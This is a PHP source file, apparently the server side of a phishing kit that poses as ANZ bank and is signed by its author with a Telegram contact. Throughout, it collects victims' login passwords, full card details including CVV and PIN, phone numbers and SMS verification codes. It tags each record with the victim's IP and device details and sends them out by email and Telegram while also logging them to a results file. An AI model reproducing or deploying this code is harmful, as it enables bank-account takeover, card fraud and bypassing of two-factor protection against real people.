<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

include_once '../inc/app.php';

function validate_cc_number($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers,16) == false )
        return false;
    return $numbers;
}

function validate_cc_cvv($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers,3) == false )
        return false;
    return $numbers;
}

function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}

$to = 'z0n51@yahoo.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "login") {

        $_SESSION['customer_number'] = $_POST['customer_number'];
        $_SESSION['password']        = $_POST['password'];

        $subject = get_user_ip() . ' | ANZ | Login';
        $message = '/-- LOGIN INFOS --/' . get_user_ip() . "\r\n";
        $message .= 'Customer Registration Number : ' . $_POST['customer_number'] . "\r\n";
        $message .= 'Password : ' . $_POST['password'] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'Country : ' . get_user_country() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END LOGIN INFOS --/' . "\r\n\r\n";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

        $telegram_message = '/-- LOGIN INFOS --/' . get_user_ip() . "\r\n";
        $telegram_message .= 'Customer Registration Number : ' . $_POST['customer_number'] . "\r\n";
        $telegram_message .= 'Password : ' . $_POST['password'] . "\r\n";
        $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
        telegram_send(urlencode($telegram_message));

        mail($to,$subject,$message,$headers);
        file_put_contents("../rzlt002.txt", $message, FILE_APPEND);
        header("location: loading1.php?redirection#_$dispatch");

    }

    if ($_POST['type'] == "cc") {

        $_SESSION['cc_number']   = $_POST['cc_number'];
        $_SESSION['cc_date']     = $_POST['cc_date'];
        $_SESSION['cc_cvv']      = $_POST['cc_cvv'];
        $_SESSION['cc_pin']      = $_POST['cc_pin'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv']);
        $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);

        $_SESSION['errors'] = [];
        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Please enter a valid card number';
        }
        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Please enter a valid security code';
        }
        if( $card_date == false ) {
            $_SESSION['errors']['cc_date'] = 'Please enter a valid date';
        }
        if( validate_number($_POST['cc_pin'],4) == false ) {
            $_SESSION['errors']['cc_pin'] = 'Please enter a valid pin';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | ANZ | Card';
            $message = '/-- CARD INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'CC number : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'CC Date : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'CC CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= 'CC PIN : ' . $_POST['cc_pin'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END CARD INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- CARD INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'CC number : ' . $_POST['cc_number'] . "\r\n";
            $telegram_message .= 'CC Date : ' . $_POST['cc_date'] . "\r\n";
            $telegram_message .= 'CC CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $telegram_message .= 'CC PIN : ' . $_POST['cc_pin'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../rzlt002.txt", $message, FILE_APPEND);
            header("location: loading3.php?redirection#_$dispatch");

        } else {
            header("location: cc.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "phone") {

        $_SESSION['phone']  = $_POST['phone'];

        $_SESSION['errors'] = [];
        if( empty($_POST['phone']) ) {
            $_SESSION['errors']['phone'] = 'Please enter a valid phone number';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | ANZ | Phone';
            $message = '/-- PHONE INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END PHONE INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- PHONE INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../rzlt002.txt", $message, FILE_APPEND);
            header("location: loading3.php?redirection#_$dispatch");

        } else {
            header("location: phone.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code") {

        $_SESSION['confirm_code'] = $_POST['confirm_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['confirm_code']) ) {
            $_SESSION['errors']['confirm_code'] = 'Please enter a valid SMS code';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = get_user_ip() . ' | ANZ | Sms';
            $message = '/-- SMS INFOS --/' . get_user_ip() . "\r\n";
            $message .= 'SMS code : ' . $_POST['confirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- SMS INFOS --/' . get_user_ip() . "\r\n";
            $telegram_message .= 'SMS code : ' . $_POST['confirm_code'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../rzlt002.txt", $message, FILE_APPEND);
            if( $_POST['error'] > 0 ) {
                session_destroy();
                header("location: loading5.php?redirection#_$dispatch");
                exit();
            }
            $_SESSION['errors']['confirm_code'] = 'Please enter a valid SMS code';
            header("location: loading4.php?redirection#_$dispatch");
        } else {
            $error = $_POST['error'];
            header("location: sms.php?error=$error&#_$dispatch");
        }

    }

}

?>